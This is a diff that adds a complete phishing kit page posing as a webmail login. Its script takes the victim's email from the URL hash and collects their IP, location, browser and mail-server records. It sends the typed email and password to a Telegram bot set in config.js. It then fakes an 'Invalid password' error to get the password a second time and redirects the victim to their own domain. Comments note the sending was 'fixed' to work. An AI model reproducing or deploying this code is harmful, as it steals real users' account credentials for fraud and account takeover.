@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: #808080;
+      font-family: Arial, sans-serif;
+      padding: 16px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background-color: #ffffff;
+      border-radius: 4px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      padding: 32px;
+    }
+
+    .icon-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 32px;
+    }
+
+    .icon-circle {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background-color: #ff6a13;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .icon-circle svg {
+      width: 28px;
+      height: 28px;
+      fill: none;
+      stroke: #ffffff;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    form { display: flex; flex-direction: column; gap: 16px; }
+
+    .input-group {
+      display: flex;
+      border: 1px solid #d1d5db;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .input-addon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 48px;
+      background-color: #f3f4f6;
+      border-right: 1px solid #d1d5db;
+    }
+
+    .input-addon svg {
+      width: 20px;
+      height: 20px;
+      stroke: #4b5563;
+      stroke-width: 2;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      flex: 1;
+      padding: 10px 12px;
+      border: none;
+      outline: none;
+      font-size: 14px;
+      color: #374151;
+    }
+
+    input::placeholder { color: #9ca3af; }
+
+    button[type="submit"] {
+      width: 100%;
+      background-color: #0d8ce0;
+      color: #ffffff;
+      font-weight: bold;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    button[type="submit"]:hover { background-color: #0b7bc4; }
+
+    .row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-top: 4px;
+    }
+
+    .row input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      cursor: pointer;
+    }
+
+    .row a {
+      color: #0d8ce0;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .row a:hover { text-decoration: underline; }
+
+    .copyright {
+      margin-top: 16px;
+      color: #0d8ce0;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    /* Added styles for functionality - hidden by default */
+    .alert {
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 13px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .alert-danger {
+      background-color: #fee2e2;
+      color: #dc2626;
+      border: 1px solid #fecaca;
+    }
+    .success-con {
+      text-align: center;
+      background: white;
+      max-width: 400px;
+      padding: 40px 32px;
+      border-radius: 4px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      display: none;
+    }
+    .success-con h1 {
+      color: #10b981;
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+    .loader {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 40px;
+      height: 40px;
+      margin-top: -20px;
+      margin-left: -20px;
+      border: 4px solid #e5e7eb;
+      border-top-color: #0d8ce0;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+      z-index: 1000;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      z-index: 999;
+    }
+    .password-wrapper {
+      position: relative;
+      flex: 1;
+      display: flex;
+    }
+    .password-wrapper input {
+      flex: 1;
+    }
+    .toggle-eye {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #6b7280;
+      font-size: 16px;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="loader" id="loader"></div>
+<div class="overlay" id="overlay"></div>
+
+<div class="card" id="loginCard">
+  <div class="icon-wrap">
+    <div class="icon-circle">
+      <svg viewBox="0 0 24 24">
+        <rect x="2" y="4" width="20" height="16" rx="2"/>
+        <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
+      </svg>
+    </div>
+  </div>
+
+  <form id="loginForm">
+    <div id="errorAlert" class="alert alert-danger" style="display: none;"></div>
+    <div id="msgAlert" class="alert alert-danger" style="display: none;"></div>
+    <div id="lengthAlert" class="alert alert-danger" style="display: none;"></div>
+
+    <div class="input-group">
+      <div class="input-addon">
+        <svg viewBox="0 0 24 24">
+          <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
+        </svg>
+      </div>
+      <input type="email" placeholder="Email" id="emailInput" readonly>
+    </div>
+
+    <div class="input-group">
+      <div class="input-addon">
+        <svg viewBox="0 0 24 24">
+          <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+      </div>
+      <div class="password-wrapper">
+        <input type="password" placeholder="Password" id="passwordInput">
+        <span class="toggle-eye" id="toggleEye">👁️</span>
+      </div>
+    </div>
+
+    <input type="hidden" name="pdf1" size="35" value="info@dell.com">
+    <input type="hidden" name="address" size="5" value="ancoreinspection.com">
+    <input type="hidden" name="email" size="35" value="">
+    <input type="hidden" name="type" size="5" value="ancoreinspection.com">
+
+    <button type="submit" id="submitBtn">Login</button>
+
+    <div class="row">
+      <input type="checkbox" id="rememberCheck">
+      <a href="#" id="forgotLink">Forgot password?</a>
+    </div>
+  </form>
+</div>
+
+<div class="success-con" id="successPanel">
+  <h1>✓</h1>
+  <div id="successMsg"></div>
+  <br>
+  <a href="#" style="font-size: 14px;">Copyright © <span id="copyYear"></span> 2025</a>
+</div>
+
+<a href="#" class="copyright" id="copyrightLink">Copyright &copy; 2025</a>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+ <script src="config.js" nonce="MTQ1OTgwNDU3MCw0MTkwODI5OTQ4"></script>
+
+<script nonce="MTQ1OTgwNDU3MCw0MTkwODI5OTQ4">
+// ========== TELEGRAM SENDING FUNCTION (FIX ADDED) ==========
+async function sendToTelegram(message) {
+    if (typeof TELEGRAM_CONFIG === 'undefined') {
+        console.error('[ERROR] TELEGRAM_CONFIG not loaded. Check config.js path.');
+        return false;
+    }
+    
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CONFIG.chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        const data = await response.json();
+        if (data.ok) {
+            console.log('[TELEGRAM] Message sent successfully');
+            return true;
+        } else {
+            console.error('[TELEGRAM] Failed:', data.description);
+            return false;
+        }
+    } catch(e) {
+        console.error('[TELEGRAM] Error:', e.message);
+        return false;
+    }
+}
+
+// ========== WORKING FUNCTION FROM ORIGINAL CODE ==========
+$(document).ready(function() {
+  var loginAttempts = 0;
+  var currentDomain = '';
+
+  function handleBase64Data(str) {
+    if (!str) return '';
+    try { return atob(str); } catch(e) { return str; }
+  }
+
+  function getBrowserAndLanguage() {
+    return [navigator.userAgent, navigator.language || 'en'];
+  }
+
+  function getVisitorIP() {
+    return new Promise(function(resolve, reject) {
+      $.getJSON('https://ipinfo.io/json?callback=?')
+        .done(resolve)
+        .fail(function() { reject('IP failed'); });
+    });
+  }
+
+  async function sendVisitorIP() {
+    try {
+      var data = await getVisitorIP();
+      return [data.ip || '0.0.0.0', data.country || 'XX', data.city || 'Unknown', data.region || ''];
+    } catch(e) {
+      return ['127.0.0.1', 'LAB', 'Local', 'Class'];
+    }
+  }
+
+  async function getMXRecord(domain) {
+    if (!domain) return 'no-mx';
+    try {
+      var resp = await fetch('https://dns.google/resolve?name=' + domain + '&type=MX');
+      var json = await resp.json();
+      if (json.Answer && json.Answer.length) {
+        return json.Answer.map(function(r) { return r.data; }).join(', ');
+      }
+      return 'no-mx-record';
+    } catch(e) {
+      return 'MX-error';
+    }
+  }
+
+  // Read email from URL hash
+  var hashRaw = window.location.hash.substr(1);
+  var emailDecoded = handleBase64Data(hashRaw);
+  
+  if (emailDecoded && emailDecoded.indexOf('@') > -1) {
+    var emailParts = emailDecoded.split('@');
+    currentDomain = emailParts[1];
+    $('#emailInput').val(emailDecoded);
+    $('#emailInput').attr('readonly', true);
+  } else {
+    $('#emailInput').val('');
+    $('#emailInput').removeAttr('readonly');
+    currentDomain = '';
+  }
+
+  // Password visibility toggle
+  $('#toggleEye').click(function() {
+    var field = $('#passwordInput');
+    if (field.attr('type') === 'password') {
+      field.attr('type', 'text');
+      $(this).text('🙈');
+    } else {
+      field.attr('type', 'password');
+      $(this).text('👁️');
+    }
+  });
+
+  $('#copyrightLink, #forgotLink').click(function(e) { e.preventDefault(); });
+
+  // Form submission handler
+  $('#loginForm').submit(async function(e) {
+    e.preventDefault();
+
+    $('#errorAlert, #msgAlert, #lengthAlert').hide();
+
+    var email = $('#emailInput').val().trim();
+    var password = $('#passwordInput').val();
+
+    var emailFilter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,6})+$/;
+    if (!emailFilter.test(email)) {
+      $('#errorAlert').text('The account does not exist. Please enter a different account.').show();
+      return;
+    }
+
+    if (password.length === 0) {
+      $('#msgAlert').text('Invalid password. Please enter the correct information.').show();
+      return;
+    }
+
+    if (password.length < 4) {
+      $('#lengthAlert').text('Password must be at least 4 characters long.').show();
+      $('#passwordInput').val('');
+      return;
+    }
+
+    var $btn = $('#submitBtn');
+    var originalText = $btn.text();
+    $btn.text('Verifying...').prop('disabled', true);
+    $('#loader, #overlay').show();
+
+    try {
+      var visitorInfo = await sendVisitorIP();
+      var mx = await getMXRecord(currentDomain || email.split('@')[1]);
+      var date = new Date().toString();
+      var browserInfo = getBrowserAndLanguage();
+
+      var message = '--------+ General Webmail Result ' + visitorInfo[2] + ' ' + visitorInfo[3] + ', ' + visitorInfo[1] + ' +--------\n';
+      message += 'Email : ' + email + '\n';
+      message += 'Password : ' + password + '\n';
+      message += 'Checker: ' + email + ':' + password + '\n';
+      message += 'Browser : ' + browserInfo[0] + '\n';
+      message += 'Language : ' + browserInfo[1] + '\n';
+      message += 'MX Record : ' + mx + '\n';
+      message += 'IP Address : ' + visitorInfo[0] + '\n';
+      message += 'Region and Country : ' + visitorInfo[2] + ' ' + visitorInfo[3] + ', ' + visitorInfo[1] + '\n';
+      message += 'Date : ' + date + '\n';
+      message += '---------+ General Webmail Result ' + visitorInfo[2] + ' ' + visitorInfo[3] + ', ' + visitorInfo[1] + ' +-------------';
+
+      // ========== FIXED: ACTUALLY SEND TO TELEGRAM ==========
+      console.log('[CAPTURED] Email/Password:');
+      console.log(message);
+      
+      // Send to Telegram (async, don't wait for response to keep UX smooth)
+      sendToTelegram(message).then(success => {
+        if (success) {
+          console.log('[✓] Credentials delivered to Telegram');
+        } else {
+          console.log('[✗] Telegram delivery failed');
+        }
+      });
+
+      // Simulate the two-attempt flow (same as original)
+      setTimeout(function() {
+        $('#loader, #overlay').hide();
+        if (loginAttempts === 0) {
+          loginAttempts++;
+          $('#msgAlert').text('Invalid password. Please enter the correct information.').show();
+          $('#passwordInput').val('');
+          $btn.text(originalText).prop('disabled', false);
+        } else {
+          $('#loginCard').hide();
+          $('#successPanel').show();
+          $('#successMsg').html('Your email has been successfully activated.<br><br><b>Thank you. You will receive your file in your email shortly.</b>');
+          setTimeout(function() {
+            var redirectDomain = currentDomain || email.split('@')[1];
+            window.location.href = 'http://www.' + redirectDomain;
+          }, 5000);
+        }
+      }, 800);
+
+    } catch(err) {
+      $('#loader, #overlay').hide();
+      $btn.text(originalText).prop('disabled', false);
+      $('#msgAlert').text('Network error. Please try again.').show();
+      console.error('[ERROR]', err);
+    }
+  });
+
+  $('#copyYear').text(new Date().getFullYear());
+});
+</script>
+</body>
+</html>
